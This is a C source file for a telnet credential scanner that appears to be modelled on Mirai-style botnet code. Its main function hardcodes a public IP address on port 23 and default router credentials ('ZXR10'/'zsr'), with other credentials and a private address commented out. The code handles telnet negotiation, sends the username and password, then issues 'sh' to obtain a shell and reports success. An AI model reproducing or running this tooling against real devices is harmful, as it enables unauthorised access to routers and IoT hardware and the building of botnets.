#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <assert.h>
#include <strings.h>
#include <string.h>
#include <time.h>

#include "scanner.h"
#include "customize.h"


static void establish_connection(struct target *conn);
static void close_connection(struct target *conn);
static int negotiate(struct target *conn);
static int can_send_username(struct target *conn);
static int can_send_password(struct target *conn);
static int is_pass_valid(struct target *conn);
static int is_exec_sh_success(struct target *conn);
static int str_find(uint8_t* source, int data_len, char* target);
static BOOL can_get_data(uint8_t *source, int data_len, int8_t *current_pos, int amount);

/*
   int main(void)
   {
   char* source = "hello,world";
   char* target = "hello";
   int ret;
   int len = strlen(source);

   ret = str_find(source, len, target);
   if (ret > 0)
   {
   printf("Find %d\n", ret);	
   }
   else
   {
   printf("Not find %d\n", ret);
   }
   }
*/

int main(void)
{
	struct target conn;
	struct auth_entry auth_set;
	int time_flag;

	//char *user = "ubuntu";
	char *user = "ZXR10";
	//char *pass = "Wind142.";
	char *pass = "zsr";
	auth_set.username = user;
	auth_set.password = pass;
	//auth_set.name_len = 6;
	auth_set.name_len = 5;
	//auth_set.pass_len = 8;
	auth_set.pass_len = 3;

	//conn.ipaddr = INET_ADDR(192,168,1,142);
	conn.ipaddr = INET_ADDR(117,36,153,180);
	conn.port = htons(23);
	conn.auth = &auth_set;
	conn.function = NULL;
	conn.try_times = 0;

	fd_set fdread, fdwrite;
	int maxfd;
	struct timeval timeout;
	timeout.tv_sec = 1;
	timeout.tv_usec = 0;

	establish_connection(&conn);
	maxfd = conn.cfd;

	while(1)
	{
		int ret = 0;
		int nfds = 0;
		FD_ZERO(&fdread);
		FD_ZERO(&fdwrite);

		int max_timeout;
		max_timeout = (conn.state > SOCKET_CONNECTING ? 10 : 5);

		//load fd into fd_set
		if (conn.state >= SOCKET_CONNECTING && time_flag - conn.last_start_time > max_timeout)
		{
			if (conn.state > TELNET_HANDLE_IAC && conn.try_times < 10)		
			{
				printf("exec here\n");
				establish_connection(&conn);	
			}
			else
			{
				close_connection(&conn);	
				break;
			}
		}

		if (conn.state == SOCKET_CONNECTING)
		{
			FD_SET(conn.cfd, &fdwrite);
		}

		if (conn.state != SOCKET_CLOSED)
		{
			FD_SET(conn.cfd, &fdread);
		}

		nfds = select(maxfd+1, &fdread, &fdwrite, NULL, &timeout);

		if (nfds == -1)
		{
			perror("select:");	
		}
		time_flag = time(NULL);

		if (FD_ISSET(conn.cfd, &fdwrite))
		{
			int err = 0;
			socklen_t err_len = sizeof(err);
			ret = getsockopt(conn.cfd, SOL_SOCKET, SO_ERROR, &err, &err_len);
			if (err == 0 &&	ret == 0)
			{
				conn.state = TELNET_HANDLE_IAC;
				conn.function = &negotiate;
				/*next combination*/
			}
			else
			{
				close_connection(&conn);
				continue;
			}
		}

		if (FD_ISSET(conn.cfd, &fdread))
		{
			int ret;
			ret = recv(conn.cfd, conn.data_buf, sizeof(conn.data_buf), MSG_NOSIGNAL);
			if (ret == 0 || ret == -1)
			{
				perror("select:");
				break;
			}
			assert(ret);
			conn.data_len = ret;
			conn.last_start_time = time(NULL);
			if (conn.state > TELNET_SEND_PASSWORD)
			{
				printf("qqqqqqqqqqqqqqqqqqqqqqqq\n");
				printf("%s\n", conn.data_buf);	
				printf("bbbbbbbbbbbbbbbbbbbbbbbb\n");
			}

			if (conn.data_buf[0] == IAC && conn.state == TELNET_SEND_USERNAME)
			{
				conn.state = TELNET_HANDLE_IAC;	
				conn.function = &negotiate;
			}

			while(1)
			{
				int used = -1;
				int ret = 0;

				if (conn.function == NULL)
				{
					break;
				}

				used = (*(conn.function))(&conn);

				if (conn.state == TELNET_LOGIN_SUCCESS)
				{
					printf("Login success!\n");
					break;
				}

				if (used < 0)
				{
					memset(conn.data_buf, '\0', sizeof(conn.data_buf));
					break;
				}
				else
				{
					/*move unprocessed data to the front*/	
					conn.data_len = conn.data_len - used;
					if (conn.data_len > 0)
					{
						memset(conn.data_buf, '\0', used);
						memmove(conn.data_buf, conn.data_buf+used, conn.data_len);
					}
					else
					{
						break;	
					}
				}
			}
		}

		if (conn.state == TELNET_LOGIN_SUCCESS)
		{
			break;	
		}
	}
	return 0;
}

static int str_find(uint8_t* source, int data_len, char* target)
{
	char *tmp_src = NULL;
	char *tmp_target = NULL;
	int i;
	int target_len = strlen(target);

	for (i = 0; (data_len - i) >= target_len; i++)
	{
		tmp_src = (char*)(source + i);	
		tmp_target = target;
		while(TRUE)
		{
			if(*tmp_target == '\0' || *tmp_target++ != *tmp_src++)
			{
				break;	
			}
		}
		if (*tmp_target == '\0')
		{
			return i + strlen(target);
		}
	}

	return -1;
}

static int is_exec_sh_success(struct target *conn)
{
	char* data_ptr = (char*)conn->data_buf;
	int data_len = conn->data_len;
	int handle_len = -1;
	int i;

	/*
	printf("**************************************\n");
	printf("now str:");
	printf("%s\n", data_ptr);
	printf("**************************************\n\n");
	*/

	for (i = data_len; i >= 0; i--)
	{
		if (data_ptr[i] == '$' || data_ptr[i] == '#' || data_ptr[i] == '~')
		{
			handle_len = i + 1;
			break;
		}
	}
	if (handle_len > 0)
	{
		conn->state++;	
		conn->function = NULL;
		printf("=====================================\n");
		printf("SH EXEC SUCCESSED\n");
		printf("%s\n", conn->data_buf);
		printf("=====================================\n\n");
	}

	return handle_len;
}

static int is_pass_valid(struct target *conn)
{
	char* data_ptr = (char*)conn->data_buf;
	int data_len = conn->data_len;
	int handle_len = -1;
	int i;
	int ret;

	for (i = data_len; i >= 0; i--)
	{
		if (data_ptr[i] == '#' || data_ptr[i] == '$' || data_ptr[i] == '~' || data_ptr[i] == '>' || data_ptr[i] == '%')
		{
			handle_len = i + 1;
			break;
		}
	}


	if (handle_len > 0)
	{
		ret = send(conn->cfd, "sh", 2, MSG_NOSIGNAL);
		assert(ret);
		ret = send(conn->cfd, "\r\n", 2, MSG_NOSIGNAL);
		assert(ret);

		conn->state++;
		conn->function = &is_exec_sh_success;

		
		printf("=====================================\n");
		printf("try times:%d\n", conn->try_times);
		printf("SH CMD SEND\n");
		printf("%s\n", conn->data_buf);
		printf("=====================================\n\n");
	}
	/*else if (handle_len == -1)
	{
		printf("*************************************\n");
		printf("%s\n", conn->data_buf);
		printf("*************************************\n\n");
	}*/
	/*else if (handle_len == -1)
	{
		if (conn->try_times < 10)
		{
			close_connection(conn);
			establish_connection(conn);	
		}
	}*/
	return handle_len;
}

static int can_send_password(struct target *conn)
{
	char *data_ptr = (char*)conn->data_buf;
	int data_len = conn->data_len;
	int handle_len = -1;
	int ret;
	int i;

	for (i = data_len; i >= 0; i--)
	{
		if (data_ptr[i] == ':' || data_ptr[i] == '>' || data_ptr[i] == '%' || data_ptr[i] == '#' || data_ptr[i] == '$')
		{
			handle_len = i + 1;	
			break;
		}
	}

	if (handle_len == -1)
	{
		ret = str_find(data_ptr, data_len, "ssword");	
		handle_len = ret;
	}

	if (handle_len > 0)
	{
		ret = send(conn->cfd, conn->auth->password, conn->auth->pass_len, MSG_NOSIGNAL);
		assert(ret);
		ret = send(conn->cfd, "\r\n", 2, MSG_NOSIGNAL);
		assert(ret);

		conn->state++;
		conn->function = &is_pass_valid;
		
		printf("=====================================\n");
		printf("PASSWORD SEND\n");
		printf("%s\n", conn->data_buf);
		printf("=====================================\n\n");
	}

	return handle_len;
}

static int can_send_username(struct target *conn)
{
	char *data_ptr = (char*)conn->data_buf;
	int data_len = conn->data_len;
	int handle_len = -1;
	int i;
	int ret;

	for (i = data_len; i >= 0; i--)
	{
		if (data_ptr[i] == ':' || data_ptr[i] == '>' || data_ptr[i] == '%' || data_ptr[i] == '#' || data_ptr[i] == '$')
		{
			handle_len = i + 1;
			break;
		}
	}

	if (handle_len == -1)
	{
		ret = str_find(data_ptr, data_len, "login");	
		if (ret == -1)
		{
			ret = str_find(data_ptr, data_len, "enter");
		}
		handle_len = ret;
	}

	if (handle_len > 0)
	{
		ret = send(conn->cfd, conn->auth->username, conn->auth->name_len, MSG_NOSIGNAL);	
		assert(ret);
		ret = send(conn->cfd, "\r\n", 2, MSG_NOSIGNAL);
		assert(ret);

		conn->state++;
		conn->function = &can_send_password;
		printf("=====================================\n");
		printf("USERNAME SEND\n");
		printf("%s\n", conn->data_buf);
		printf("=====================================\n\n");
	}

	return handle_len;
}

//sub-option negotiation
static int negotiate(struct target *conn)
{
	uint8_t *data_ptr = conn->data_buf;
	int data_len = conn->data_len;
	int ret;
	int handle_len = 0;

	while (handle_len < data_len)
	{
		if (data_ptr[0] != IAC)
		{
			break;	
		}

		/*to check whether it can conitune*/
		if (!can_get_data(conn->data_buf, data_len, data_ptr, 2))
		{
			break;	
		}

		/*we must reply our window size to server.*/
		if (data_ptr[1] == DONT || data_ptr[1] == WONT)
		{
			data_ptr += 3;	
		}
		else if ((data_ptr[1] == DO) && (data_ptr[2] == WIN_SIZE))
		{
			uint8_t iac_win_size[3] = {IAC, WILL, WIN_SIZE};	
			uint8_t tell_win_size[9] = {IAC, SOBEGIN, WIN_SIZE, 0, 80, 0, 0, IAC, SOEND};

			ret = send(conn->cfd, iac_win_size, 3, MSG_NOSIGNAL);
			assert(ret);
			ret = send(conn->cfd, tell_win_size, 9, MSG_NOSIGNAL);
			assert(ret);

			data_ptr += 3;
			handle_len += 3;
		}
		else
		{
			data_ptr[1] = data_ptr[1] == DO ? WONT : DO;

			ret = send(conn->cfd, data_ptr, 3, MSG_NOSIGNAL);
			assert(ret);

			data_ptr += 3;
			handle_len += 3;
		}
	}

	if (handle_len > 0)
	{
		conn->state++;
		conn->function = &can_send_username;	
	}

	return handle_len;
}

static BOOL can_get_data(uint8_t *source, int data_len, int8_t *current_pos, int amount)
{
	uint8_t *tail = source + data_len;
	uint8_t *current = current_pos + amount;

	if (current <= tail)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

static void establish_connection(struct target *conn)
{
	int ret;
	struct sockaddr_in serv_addr;

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = conn->ipaddr;
	serv_addr.sin_port = conn->port;

	conn->cfd = socket(AF_INET, SOCK_STREAM, 0);
	assert(conn->cfd);

	ret = connect(conn->cfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
	assert(!ret);

	conn->state = SOCKET_CONNECTING;
	conn->last_start_time = time(NULL);
	conn->function = NULL;
}

static void close_connection(struct target *conn)
{
	if (conn->cfd != -1)
	{
		close(conn->cfd);	
		conn->cfd = -1;
		conn->state = SOCKET_CLOSED;
		conn->function = NULL;
	}
}
